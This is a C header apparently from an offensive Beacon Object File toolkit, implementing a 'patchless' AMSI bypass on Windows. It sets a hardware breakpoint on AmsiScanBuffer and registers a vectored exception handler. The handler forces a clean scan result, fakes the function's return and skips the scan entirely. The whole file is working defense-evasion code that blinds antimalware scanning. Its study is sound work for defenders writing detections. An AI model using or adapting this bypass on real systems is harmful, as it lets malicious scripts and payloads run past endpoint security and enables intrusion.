#ifndef PATCHLESS_AMSI_H
#define PATCHLESS_AMSI_H

#include <windows.h>
#include "utils.h"

static const int AMSI_RESULT_CLEAN = 0;

static __attribute__((section(".data")))  PVOID g_amsiScanBufferPtr = nullptr;

static unsigned long long setBits(unsigned long long dw, int lowBit, int bits, unsigned long long newValue) {
    unsigned long long mask = (1UL << bits) - 1UL;
    dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
     return dw;
}

static void enableBreakpoint(CONTEXT& ctx, PVOID address, int index) {

      switch (index) {
          case 0:
              ctx.Dr0 = (ULONG_PTR)address;
              break;
          case 1:
              ctx.Dr1 = (ULONG_PTR)address;
              break;
          case 2:
              ctx.Dr2 = (ULONG_PTR)address;
              break;
          case 3:
              ctx.Dr3 = (ULONG_PTR)address;
              break;
      }

      //Set bits 16-31 as 0, which sets
      //DR0-DR3 HBP's for execute HBP
      ctx.Dr7 = setBits(ctx.Dr7, 16, 16, 0);

      //Set DRx HBP as enabled for local mode
      ctx.Dr7 = setBits(ctx.Dr7, (index * 2), 1, 1);
      ctx.Dr6 = 0;
}

static void clearHardwareBreakpoint(CONTEXT* ctx, int index) {

    //Clear the releveant hardware breakpoint
       switch (index) {
           case 0:
               ctx->Dr0 = 0;
               break;
           case 1:
               ctx->Dr1 = 0;
               break;
           case 2:
               ctx->Dr2 = 0;
               break;
           case 3:
               ctx->Dr3 = 0;
               break;
       }

       //Clear DRx HBP to disable for local mode
       ctx->Dr7 = setBits(ctx->Dr7, (index * 2), 1, 0);
       ctx->Dr6 = 0;
       ctx->EFlags = 0;
}

static ULONG_PTR getArg(CONTEXT* ctx, int index){

#ifdef __x86_64
        switch(index){
            case 0:
                return ctx->Rcx;
            case 1:
                return ctx->Rdx;
            case 2:
                return ctx->R8;
            case 3:
                return ctx->R9;
            default:
                return *(ULONG_PTR*)(ctx->Rsp+((index+1)*8));
        }
#else
        return *(DWORD_PTR*)(ctx->Esp+((index+1)*4));
#endif

}

static ULONG_PTR getReturnAddress(CONTEXT* ctx){
#ifdef __x86_64
        return *(ULONG_PTR*)ctx->Rsp;
#else
        return *(ULONG_PTR*)ctx->Esp;
#endif
}

static void setResult(CONTEXT* ctx, ULONG_PTR result){
#ifdef __x86_64
        ctx->Rax = result;
#else
        ctx->Eax = result;
#endif
}

static void adjustStackPointer(CONTEXT* ctx, int amount){
#ifdef __x86_64
        ctx->Rsp += amount;
#else
        ctx->Esp += amount;
#endif
}

static void setIP(CONTEXT* ctx, ULONG_PTR newIP){
#ifdef __x86_64
        ctx->Rip = newIP;
#else
        ctx->Eip = newIP;
#endif
}

static void handleAMSIBypass(PEXCEPTION_POINTERS exceptions){

    //Get the return address by reading the value currently stored at the stack pointer
    ULONG_PTR returnAddress = getReturnAddress(exceptions->ContextRecord);

    //Get the address of the 5th argument, which is an int* and set it to a clean result
    int* scanResult = (int*)getArg(exceptions->ContextRecord, 5);
    *scanResult = AMSI_RESULT_CLEAN;

    //update the current instruction pointer to the caller of AmsiScanBuffer
    setIP(exceptions->ContextRecord, returnAddress);

#ifdef __x86_64
    //We need to adjust the stack pointer accordinly too so that we simulate a ret instruction
    adjustStackPointer(exceptions->ContextRecord, sizeof(PVOID));
#else
    //6 arguments + return address since __stdcall calling convention is in use on x86
    adjustStackPointer(exceptions->ContextRecord, 28);
#endif

    //Set the eax/rax register to 0 (S_OK) indicatring to the caller that AmsiScanBuffer finished successfully
    setResult(exceptions->ContextRecord, S_OK);
}

static LONG WINAPI exceptionHandler(PEXCEPTION_POINTERS exceptions){

    if(exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
            (exceptions->ExceptionRecord->ExceptionAddress == g_amsiScanBufferPtr )){

        handleAMSIBypass(exceptions);
        return EXCEPTION_CONTINUE_EXECUTION;

    }else{
        return EXCEPTION_CONTINUE_SEARCH;
    }
}

static PVOID getFunction(const char* libraryName, const char* function){

    BOF_LOCAL(KERNEL32, GetModuleHandleA);
    BOF_LOCAL(KERNEL32, LoadLibraryA);
    BOF_LOCAL(KERNEL32, GetProcAddress);

    HMODULE library = GetModuleHandleA(libraryName);

    if(library == nullptr){

        library = LoadLibraryA(libraryName);

        if(library == nullptr){
            return nullptr;
        }
    }

    return (PVOID)GetProcAddress(library, function);
}

static void enableBreakpoint(void* function, int bpIndex){

    BOF_LOCAL(KERNEL32, GetThreadContext);
    BOF_LOCAL(KERNEL32, SetThreadContext);
    BOF_LOCAL(msvcrt, memset);

    CONTEXT threadCtx;
    memset(&threadCtx, 0, sizeof(threadCtx));
    threadCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    //Set a hardware breakpoint on the function for the current thread
    if(GetThreadContext((HANDLE)-2, &threadCtx)){
        enableBreakpoint(threadCtx, function, bpIndex);
        SetThreadContext((HANDLE)-2, &threadCtx);
    }
}

static void clearHardwareBreakpoint(int bpIndex){

    BOF_LOCAL(KERNEL32, GetThreadContext);
    BOF_LOCAL(KERNEL32, SetThreadContext);
    BOF_LOCAL(msvcrt, memset);

    CONTEXT threadCtx;
    memset(&threadCtx, 0, sizeof(threadCtx));
    threadCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    //Clear hardware breakpoint on the specific HBP slot on the current thread
    if(GetThreadContext((HANDLE)-2, &threadCtx)){
        clearHardwareBreakpoint(&threadCtx, bpIndex);
        SetThreadContext((HANDLE)-2, &threadCtx);
    }
}

static HANDLE setupBypasses(){

    BOF_LOCAL(KERNEL32, AddVectoredExceptionHandler);

    g_amsiScanBufferPtr = getFunction("amsi.dll", "AmsiScanBuffer");

    if(g_amsiScanBufferPtr == nullptr){
        return nullptr;
    }

    //add our vectored exception handler
    HANDLE hExHandler = AddVectoredExceptionHandler(1, exceptionHandler);

    if(g_amsiScanBufferPtr != nullptr){
        enableBreakpoint(g_amsiScanBufferPtr, 0);
    }

    return hExHandler;
}

static void clearBypasses(HANDLE hExHandler){

    BOF_LOCAL(KERNEL32, RemoveVectoredExceptionHandler);

    clearHardwareBreakpoint(0);
    clearHardwareBreakpoint(1);

    if(hExHandler != nullptr)
        RemoveVectoredExceptionHandler(hExHandler);
}


#endif // PATCHLESS_AMSI_H
